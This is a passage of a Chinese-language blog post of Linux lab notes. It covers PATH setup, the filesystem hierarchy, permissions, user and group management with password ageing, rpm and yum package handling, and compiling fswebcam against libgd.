$PATH</code>，查看Linux环境变量PATH的值。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps45.jpg" alt="img"></p></li><li><p>新建目录“&#x2F;opt&#x2F;arm-linux&#x2F;bin”，在Shell终端中执行以下命令：</p><p><code>export PATH=$PATH:/opt/arm-linux/bin</code></p><p>执行完毕后检查PATH变量的值，是否有加入路径“&#x2F;opt&#x2F;arm-linux&#x2F;bin”，执行exit退出当前Shell，然后再次启动一个终端，查看PATH路径列表，是否有“&#x2F;opt&#x2F;arm-linux&#x2F;bin”</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps46.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps47.jpg" alt="img"></p></li><li><p>用全屏幕编辑工具vi编写一个文件setenv.sh，在setenv.sh写入能够为环境变量PATH新增路径“&#x2F;opt&#x2F;arm-linux&#x2F;bin”的命令：<br><code>export PATH=$PATH:/opt/arm-linux/bin</code></p><p>保存退出vi，然后执行“source setenv.sh”命令，执行完成后再次查看PATH 的结果，检查PATH变量设置效果；关闭当前终端，再次启动一个终端，检查PATH变量是否还有路径“&#x2F;opt&#x2F;arm-linux&#x2F;bin”。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps48.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps49.jpg" alt="img"></p></li><li><p>新建目录“&#x2F;opt&#x2F;bin”，使用全屏幕编辑工具vi修改系统环境配置文件中PATH变量设置，使得新修改后的PATH变量新增路径“&#x2F;opt&#x2F;bin”，要求修改后的PATH路径对每个用户都能生效。保存后注销当前用户登录，并使用root帐号重新登陆一次，再次开启终端并检查PATH变量的路径列表中是否有添加新的路径“&#x2F;opt&#x2F;bin”。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps50.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps51.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps52.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps53.jpg" alt="img"></p></li><li><p>把实验5的sdl-image-view.tar.gz中的可执行文件viewimage复制到&#x2F;opt&#x2F;bin，测试一下当&#x2F;opt&#x2F;bin目录添加到PATH路径后，能否在shell任意当前目录执行该程序</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps54.jpg" alt="img"></p></li></ol><hr><h1 id="Linux文件系统"><a href="#Linux文件系统" class="headerlink" title="Linux文件系统"></a>Linux文件系统</h1><h2 id="FHS-目录树"><a href="#FHS-目录树" class="headerlink" title="FHS 目录树"></a>FHS 目录树</h2><p>&#x2F;：根目录，通常以独立分区挂载</p><p>&#x2F;bin：命令行工具，不能单独挂载为一个分区</p><p>&#x2F;boot：linux启动文件，包括linux内核文件以及启动引导程序的配置文件</p><p>&#x2F;dev：设备与外设接口</p><p>&#x2F;etc：配置文件</p><p>&#x2F;home：存放所有普通用户主目录的目录</p><p>&#x2F;lib：系统函数库，不要以单独的分区挂载此目录</p><p>&#x2F;media：可移动设备的挂载点，如软驱、光驱和U盘</p><p>&#x2F;mnt：挂载某些额外设备</p><p>&#x2F;opt：放置非原 linux 发行版提供的第三方软件</p><p>&#x2F;root：root 主目录，需要与根分区处于同一目录</p><p>&#x2F;sbin：系统管理命令，不要以单独的分区挂载此目录</p><p>&#x2F;tmp：临时文件目录</p><p>&#x2F;usr：与 UNIX 操作系统软件资源相关的目录</p><p>&#x2F;var：与系统运行过程有关</p><hr><h2 id="文件与文件类型"><a href="#文件与文件类型" class="headerlink" title="文件与文件类型"></a>文件与文件类型</h2><p>“一切皆文件”</p><p>普通文件、目录文件</p><p>设备文件：系统把每个I&#x2F;O设备都看成一个文件，通常在 &#x2F;dev 下</p><p>链接文件：硬链接、软链接</p><p>管道文件：当两个进程需要进行数据与信息传递时，可以使用管道文件。写入的数据每次都添加到管道缓冲区的末尾，读数据的时候都是从缓冲区的头部读出数据的，管道文件通常建立在内存中</p><hr><h2 id="文件系统访问-Shell-命令"><a href="#文件系统访问-Shell-命令" class="headerlink" title="文件系统访问 Shell 命令"></a>文件系统访问 Shell 命令</h2><p>依旧记一些少用的</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> 文件1 文件2 文件3 目录<span class="token function">mv</span> 文件1 文件2 文件3 目录<span class="token comment"># 复制/移动多个文件到目录</span><span class="token function">cp</span> <span class="token parameter variable">-r</span> 源目录 目标目录<span class="token comment"># 以递归形式复制整个目录的文件及其下级子目录</span><span class="token function">rm</span> -f/--force<span class="token comment"># 从不提示，直接删除</span><span class="token function">rm</span> <span class="token punctuation">[</span>-i/--interactive<span class="token punctuation">]</span><span class="token comment"># 交互式删除，等待用户确认，需要主动输入y进行确认</span><span class="token function">rm</span> -r/-R/--recursive<span class="token comment"># 将参数中列出的全部目录和子目录均递归删除</span><span class="token function">cat</span> <span class="token operator">></span> filename<span class="token comment"># 从键盘创建一个文件，结合输出重定向，ctrl+d结束输入</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>复制 &#x2F;etc&#x2F;fstab、&#x2F;etc&#x2F;inittab 文件到 &#x2F;root&#x2F;lab4&#x2F;bak&#x2F; 目录：</p><p>可用<code>cp /etc/fstab /etc/inittab /root/lab4/bak/</code></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps12.jpg" alt="img"></p><p>复制&#x2F;etc&#x2F;passwd文件到&#x2F;root&#x2F;lab4&#x2F;bak&#x2F;目录，并把该文件重命名为passwd.bk：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/10.jpg" alt="img"></p><p>使用<code>cat &gt; hello.txt</code>命令建立文件hello.txt，输入5行英文：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps11.jpg" alt="img"></p><p>执行<code>view /root/lab4/file/hello.txt</code>验证文件内容是否是前一步输入的内容：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/11.jpg" alt="img"></p><p>把&#x2F;root&#x2F;lab4&#x2F;file&#x2F;hello.txt文件复制到&#x2F;root&#x2F;lab4&#x2F;temp&#x2F;目录：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/12.jpg" alt="img"></p><p>删除非空目录&#x2F;root&#x2F;lab4&#x2F;aa：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps13.jpg" alt="img"></p><p>复制文件 &#x2F;root&#x2F;lab4&#x2F;file&#x2F;hello.txt 到 &#x2F;root&#x2F;lab4&#x2F;file&#x2F; 目录中并命名为hello-new.txt：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps14.jpg" alt="img"></p><hr><h2 id="从rpm包安装tree"><a href="#从rpm包安装tree" class="headerlink" title="从rpm包安装tree"></a>从rpm包安装tree</h2><p>把树形目录列表显示工具 tree 软件安装包文件 tree-1.5.3-2.el6.i686.rpm 通过 winscp 复制到 Linux 虚拟机，进入该 rpm 包所在的目录，执行 rpm 软件包安装命令<code>rpm -ivh tree-1.5.3-2.el6.i686.rpm</code>安装 tree 工具软件包</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps15.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps16.jpg" alt="img"></p><hr><h2 id="使用外部存储设备"><a href="#使用外部存储设备" class="headerlink" title="使用外部存储设备"></a>使用外部存储设备</h2><p>vmware 连接U盘到虚拟机中</p><p>mount 挂载</p><p>umount 卸载</p><p>设U盘安装的加载点为 &#x2F;media&#x2F;KINGSTON，识别为 &#x2F;dev&#x2F;sdb1</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">umount</span> /dev/sdb1<span class="token comment"># 或</span><span class="token function">umount</span> /media/KINGSTON<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /mnt/usbdisk<span class="token function">mount</span> <span class="token parameter variable">-t</span> vfat <span class="token parameter variable">-o</span> <span class="token assign-left variable">iocharset</span><span class="token operator">=</span>utf8 /dev/sdb1 /mnt/usbdisk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="文件系统权限配置与管理"><a href="#文件系统权限配置与管理" class="headerlink" title="文件系统权限配置与管理"></a>文件系统权限配置与管理</h2><p>Linux 文件系统支持 UGO（User, Group, Other）访问控制机制</p><p>UGO 访问控制模型通过给linux系统中的文件赋予两个属性来起作用：所有者和访问权限</p><p>查看文件所有者与文件权限属性：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241217003804957.png" alt="image-20241217003804957"></p><p>文件权限位：drwxr-xr-x文件拥有者：root文件所属组：4096</p><br><p>文件权限位示意图：</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241217003306623.png" alt="image-20241217003306623"></p><p>文件类型：&quot;-&quot;为普通文件，&quot;d&quot;为目录文件，&quot;i&quot;为连接文件，&quot;b”为块设备文件，&quot;c&quot;为字符设备文件</p><br><p>权限的数字表示形式：使用3位八进制的数字形式表示某个文件或目录实际配置的权限</p><p>如 rwx r-x r-x，其中转换进制：</p><p>rwx —— 111 —— 7（二进制转换为八进制）</p><p>r-x —— 101 —— 5</p><br><h3 id="文件权限设置"><a href="#文件权限设置" class="headerlink" title="文件权限设置"></a>文件权限设置</h3><p>权限修改命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token punctuation">[</span>-R<span class="token punctuation">]</span> <span class="token punctuation">[</span>who<span class="token punctuation">]</span> <span class="token punctuation">[</span>+ <span class="token operator">|</span> - <span class="token operator">|</span> <span class="token operator">=</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>mode<span class="token punctuation">]</span> <span class="token operator">&lt;</span>file_name<span class="token operator">></span>/<span class="token operator">&lt;</span>directory_name<span class="token operator">></span><span class="token parameter variable">-R</span> <span class="token comment"># 表示递归设置，即整个目录树都使用相同的权限配置</span><span class="token function">who</span> <span class="token comment"># 表示操作对象，有u（user）、g（group）、o（others）、a（all）可选</span>+ <span class="token comment"># 添加权限</span>- <span class="token comment"># 取消权限</span><span class="token operator">=</span> <span class="token comment"># 直接赋予给定的权限，取消所有以前设置的权限</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>文件拥有者修改命令：</p><p>root 用户可以直接修改文件拥有者</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chown</span> <span class="token punctuation">[</span>-R<span class="token punctuation">]</span> <span class="token operator">&lt;</span>user_name<span class="token operator">></span> <span class="token operator">&lt;</span>directory_name<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><p>文件所在组修改命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chgrp</span> <span class="token punctuation">[</span>-R<span class="token punctuation">]</span> <span class="token operator">&lt;</span>group_name<span class="token operator">></span> <span class="token operator">&lt;</span>file_name<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="Linux用户账号配置与管理"><a href="#Linux用户账号配置与管理" class="headerlink" title="Linux用户账号配置与管理"></a>Linux用户账号配置与管理</h1><h2 id="获取登录用户账号信息"><a href="#获取登录用户账号信息" class="headerlink" title="获取登录用户账号信息"></a>获取登录用户账号信息</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">id</span><span class="token comment"># 查看用户账号信息，如用户UID、主组GID、用户所属组的信息</span><span class="token function">ps</span> <span class="token parameter variable">-l</span><span class="token comment"># 查看当前正在运行进程的详细信息，包括建立进程的UID、进程PID和创建该进程的父进程PPID</span><span class="token function">ls</span> <span class="token parameter variable">-ln</span><span class="token comment"># 查看文件系统中文件与目录的拥有者的UID与文件所处的组的GID信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><p>Linux 是多用户多任务操作系统，从本地或从远程登录的多个用户可以同时使用同一台运行 Linux 操作系统的计算机</p><p>Linux 系统内部使用用户ID（UID）来识别用户</p><p>在 Linux 系统中所有进行的工作都是以进程的方式进行的，运行的程序都体现为进程</p><p>用户账号分为三类：</p><ul><li>超级用户：root，UID为0，GID为0，最高权限</li><li>普通用户：只能管理自己启动的进程，只能操作其拥有权限的文件与目录，通常普通用户默认配置的UID值为500~60000</li><li>系统用户：伪用户，与系统服务相关，UID值为1~499</li></ul><h3 id="用户组"><a href="#用户组" class="headerlink" title="用户组"></a>用户组</h3><p>具有相同特征或具有某种特定联系的用户的集合，用于表示该组内所有用户的账号称为组账号</p><p>Linux 系统中每个用户账号至少属于一个用户组；一个组中可以有多个用户，一个用户也可以属于多个不同的组；一个用户只能属于一个主组，但可以同时属于多个附加组</p><p>主组：用户登录 Linux 系统后的默认组，在 &#x2F;etc&#x2F;passwd 中的 GID 字段有记载，用户的主组可以切换，使用<code>newgrp 组名</code>，切换后原先的组变为附加组</p><p>用户组分类：</p><ul><li>标准组</li><li>系统组</li><li>私有组</li></ul><p>如要使多个用户能查看、修改某一文件或执行某个命令，可以先把这些用户都定义到同一用户组，然后修改文件或目录的权限，让改用户组具有相应的权限</p><h3 id="用户与用户组信息文件"><a href="#用户与用户组信息文件" class="headerlink" title="用户与用户组信息文件"></a>用户与用户组信息文件</h3><ul><li><p>用户账号信息 &#x2F;etc&#x2F;passwd</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">用户名:口令（该字段现已为x或*）:<span class="token environment constant">UID</span>:GID:注释性描述:主目录:登录shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216215628084.png" alt="image-20241216215628084"></p></li><li><p>用户密码信息及其密码时限文件 &#x2F;etc&#x2F;shadow</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">用户名:加密口令:口令最后修改时间:口令最小有效天数:口令最大有效天数:警告时间:不活动时间:账号过期失效时间:标志<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216215831695.png" alt="image-20241216215831695"></p></li><li><p>用户组信息文件 &#x2F;etc&#x2F;group</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">组名:口令:GID:组内成员列表<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216220053865.png" alt="image-20241216220053865"></p></li><li><p>用户组密码文件 &#x2F;etc&#x2F;gshadow</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">组名:口令:组管理者:组成员<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216220302442.png" alt="image-20241216220302442"></p></li></ul><hr><h2 id="建立用户和用户组账号"><a href="#建立用户和用户组账号" class="headerlink" title="建立用户和用户组账号"></a>建立用户和用户组账号</h2><p>建立用户组</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">groupadd</span> 选项 用户组名<span class="token function">groupadd</span> <span class="token parameter variable">-g</span> GID 用户组名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>建立用户账号并设定登录密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">useradd</span> 选项 用户名<span class="token parameter variable">-u</span> <span class="token environment constant">UID</span> <span class="token comment"># 指定用户账号对应的UID</span><span class="token parameter variable">-g</span> 组名 <span class="token comment"># 指定用户账号的初始默认组</span><span class="token parameter variable">-G</span> 组名1，组名2，组名3，<span class="token punctuation">..</span>. <span class="token comment"># 指定用户所属的附加组</span><span class="token parameter variable">-m</span> <span class="token comment"># 创建用户主目录</span><span class="token parameter variable">-M</span> <span class="token comment"># 不建立用户主目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">passwd</span> 选项 用户名<span class="token parameter variable">--stdin</span> <span class="token comment"># 从标准输入读取令牌</span><span class="token builtin class-name">echo</span> <span class="token string">""</span> <span class="token operator">|</span> <span class="token function">passwd</span> <span class="token parameter variable">--stdin</span> 用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>设定组密码与管理组成员</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gpasswd <span class="token punctuation">[</span>-a user<span class="token punctuation">]</span> <span class="token punctuation">[</span>-d user<span class="token punctuation">]</span><span class="token punctuation">[</span>-A user,<span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token punctuation">[</span>-M user,<span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token punctuation">[</span>-r<span class="token punctuation">]</span><span class="token punctuation">[</span>-R<span class="token punctuation">]</span> groupname<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改用户账号</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">usermod</span> 选项 用户名<span class="token function">usermod</span> <span class="token parameter variable">-m</span> <span class="token parameter variable">-d</span> /home/new-dir user1<span class="token comment"># 修改用户user1的主目录为/home/new-dir，把原来用户的主目录迁移到新目录中</span><span class="token function">usermod</span> <span class="token parameter variable">-l</span> new-username user1<span class="token comment"># 修改用户user1的用户名为new-username</span><span class="token parameter variable">-g</span> 组名 <span class="token comment"># 修改用户账号的初始默认组（主组）</span><span class="token parameter variable">-G</span> 组名1 组名2 组名3 <span class="token comment"># 修改用户所属的附加组</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改用户组信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">groupmod</span> 选项 用户组<span class="token function">groupmod</span> <span class="token parameter variable">-g</span> <span class="token number">600</span> group2<span class="token comment"># 将组group2的组标识号修改为600</span><span class="token function">groupmod</span> <span class="token parameter variable">-g</span> <span class="token number">10000</span> <span class="token parameter variable">-n</span> group3 group2<span class="token comment"># 将组group2的标识号改为10000，组名修改为group3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>删除用户、删除组</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">groupdel</span> 用户组<span class="token function">userdel</span> <span class="token parameter variable">-r</span> 用户名<span class="token comment"># -r删除用户时也删除用户相关的文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br><h3 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h3><p>建立标准组:account （gid&#x3D;1200）、admin   (gid&#x3D;1000)、sale  (gid&#x3D;1100)</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/1.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/2.jpg" alt="img"></p><p>建立一个主组属于admin的帐号 admin-user1，其uid为1001<br>建立一个附加组属于admin的帐号 admin-user2，其uid为1002<br>建立一个主组属于sale的帐号 sale-user1，其uid为1101<br>建立一个附加组属于sale的帐号 sale-user2，其uid为1102<br>建立一个主组属于account的帐号 account-user1，其uid为1201<br>建立一个附加组属于account的帐号 account-user2，其uid为1202<br>建立一个主组属于admin，附加组属于sale、account的用户帐号 admin-all，uid为1000<br>建立完用户后 ，给这些用户设定初始密码&quot;123456&quot;</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/3.jpg" alt="img"></p><p>建立两个新组 fjnumcs、fjnu</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/4.jpg" alt="img"></p><p>建立用户 jack、lucy，并把其主组设置为 fjnumcs，附加组设置为 fjnu</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/6.jpg" alt="img"></p><hr><h2 id="口令时限机制"><a href="#口令时限机制" class="headerlink" title="口令时限机制"></a>口令时限机制</h2><p>每个用户账号的口令时效配置参数体现在 &#x2F;etc&#x2F;shadow</p><p>设置口令时效信息有两种方式：</p><ol><li>对所有新建立的用户自动设置并启动口令时效机制，需要修改建立用户的默认配置文件 &#x2F;etc&#x2F;login.defs 以及 &#x2F;etc&#x2F;default&#x2F;useradd</li><li>对已经建立好的用户账号，可以用<code>chage</code>命令修改口令时效参数</li></ol><p>在 &#x2F;etc&#x2F;login.defs 修改系统关于口令的默认设置，使得密码长度不小于8位，口令有效期为60天</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/5.jpg" alt="img"></p><p>&#x2F;etc&#x2F;default&#x2F;useradd</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241217002104424.png" alt="image-20241217002104424"></p><p>INACTIVE（口令从过期到锁定的时间）</p><p>EXPIRE（失效日期）</p><hr><h2 id="情景实验：Linux用户组共享目录权限配置"><a href="#情景实验：Linux用户组共享目录权限配置" class="headerlink" title="情景实验：Linux用户组共享目录权限配置"></a>情景实验：Linux用户组共享目录权限配置</h2><ol><li><p>某公司新来了5个合约为2年的员工（jack、tom、jerry、jason、ketty），这些人员成立了一个研发团队，为这些员工建立一个用户账号，并为建立用户账号把新建立的员工归属到附加组g_deepmind。要求，设定每个员工需要每隔90天修改密码，账号有效期到2023年12月31日。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/7.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/8.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/91.jpg" alt="img"></p></li><li><p>为研发团队g_deepmind建立一个组共享目录&#x2F;home&#x2F;g_deepmind，使得g_deepmind组中的用户能够通过该共享目录&#x2F;home&#x2F;g_deepmind相互共享并交换文件，要求用户在该目录中建立的文件能够不能被其他用户随意删除（目录拥有者除外，可以设置目录拥有者为项目组长），并且自动与用户组成员共享。</p></li></ol><p>   <img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/101.jpg" alt="img"></p><ol start="3"><li><p>建立临时用户t_user1、t_user2，配置用户组g_deepmind，使得临时用户也可以切换g_deepmind为主组登陆系统，临时访问组共享目录&#x2F;home&#x2F;g_deepmind。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/111.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/121.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/131.jpg" alt="img"></p></li></ol><hr><h1 id="Linux软件包安装与管理"><a href="#Linux软件包安装与管理" class="headerlink" title="Linux软件包安装与管理"></a>Linux软件包安装与管理</h1><h2 id="软件包依赖性"><a href="#软件包依赖性" class="headerlink" title="软件包依赖性"></a>软件包依赖性</h2><p>任务1：运行预先编译好的jpg图片查看可执行程序viewimage</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps41.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps42.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps43.jpg" alt="img"></p><p>任务2： 编译运行源码软件，cmatrix-1.2a.tar.gz</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps44.jpg" alt="img"></p><hr><h2 id="软件编译安装"><a href="#软件编译安装" class="headerlink" title="软件编译安装"></a>软件编译安装</h2><p>尝试在rhel6.3或者ubuntu18.04系统中编译fswebcam</p><p>上传并解压fswebcam_20140113.orig.tar.xz</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>报错<code>configure: error: GD graphics library not found</code></p><p>安装 GD 库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> gd-devel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不幸的是查无此库</p><p>尝试从源码编译 gd-devel，源码包下载：<a href="https://github.com/libgd/libgd/releases/download/gd-2.3.2/libgd-2.3.2.tar.xz">https://github.com/libgd/libgd/releases/download/gd-2.3.2/libgd-2.3.2.tar.xz</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure<span class="token function">make</span><span class="token operator">&amp;&amp;</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样就可以编译 fswebcam 了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure<span class="token function">make</span><span class="token operator">&amp;&amp;</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241106012228777.png" alt="image-20241106012228777"></p><p>尝试以不同分辨率运行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fswebcam <span class="token parameter variable">-r</span> 800x600 --no-banner d1.jpg <span class="token parameter variable">-d</span> /dev/video0fswebcam <span class="token parameter variable">-r</span> 960x720 --no-banner d2.jpg <span class="token parameter variable">-d</span> /dev/video0fswebcam <span class="token parameter variable">-r</span> 640x480 --no-banner d3.jpg <span class="token parameter variable">-d</span> /dev/video0fswebcam <span class="token parameter variable">-D</span> <span class="token number">10</span> <span class="token parameter variable">-r</span> 640x480 --no-banner d3.jpg <span class="token parameter variable">-d</span> /dev/video0fswebcam <span class="token parameter variable">-D</span> <span class="token number">2</span> <span class="token parameter variable">--title</span> <span class="token string">"welcome"</span> <span class="token parameter variable">-r</span> 640x480  d3.jpg <span class="token parameter variable">-d</span> /dev/video0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行时报错<code>fswebcam: error while loading shared libraries: libgd.so.3: cannot open shared object file: No such file or directory</code>，没找到库文件</p><p>全局搜索对应文件并添加 LD_LIBRARY_PATH</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> <span class="token string">"libgd.so.3"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">LD_LIBRARY_PATH</span><span class="token operator">=</span>/root/ex_lab/libgd-2.3.2/src/.libs:<span class="token variable">$LD_LIBRARY_PATH</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后就可以成功运行了</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241106012633210.png" alt="image-20241106012633210"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241106012744417.png" alt="image-20241106012744417"></p><hr><h2 id="RPM-amp-YUM（CentOS系）"><a href="#RPM-amp-YUM（CentOS系）" class="headerlink" title="RPM&amp;YUM（CentOS系）"></a>RPM&amp;YUM（CentOS系）</h2><ol><li><p>启动RHEL6.3虚拟机，使用root登陆，加载RHEL6.3安装光盘</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps26.jpg" alt="img"></p></li><li><p>使用“rpm -qa  | grep -i  SDL” 查看Linux系统中已经安装的软件包列表中是否包括有SDL、SDL-devel（SDL是一种游戏引擎开发库，SDL-devel是其对应开发包），如果有安装SDL-devel软件包，请使用rpm工具的卸载命令SDL-devel软件包；</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps27.jpg" alt="img"></p></li><li><p>使用rpm查询系统已经安装软件的命令查看Linux系统中是否已经安装SDL_image、SDL_image-devel软件包</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps28.jpg" alt="img"></p></li><li><p>进入光盘安装加载目录，在RHEL6.3安装光盘Packages目录中的查找SDL、SDL-devel以及alsa-lib-devel对应的rpm安装文件</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps29.jpg" alt="img"></p></li><li><p>使用查询rpm软件包中文件列表的命令<code>rpm -qpl</code>查看实验资源目录lab6中的SDL_image-1.2.12-9.el6.i686.rpm、SDL_image-devel-1.2.12-9.el6.i686.rpm两个rpm文件中包含有哪些文件</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps30.jpg" alt="img"></p></li><li><p>使用查询rpm软件包中文件列表的命令<code>rpm -qpl</code>查看SDL-1.2.14-3.el6.i686.rpm、SDL-devel-1.2.14-3.el6.i686.rpm 两个rpm软件包安装文件中包含有哪些文件</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps31.jpg" 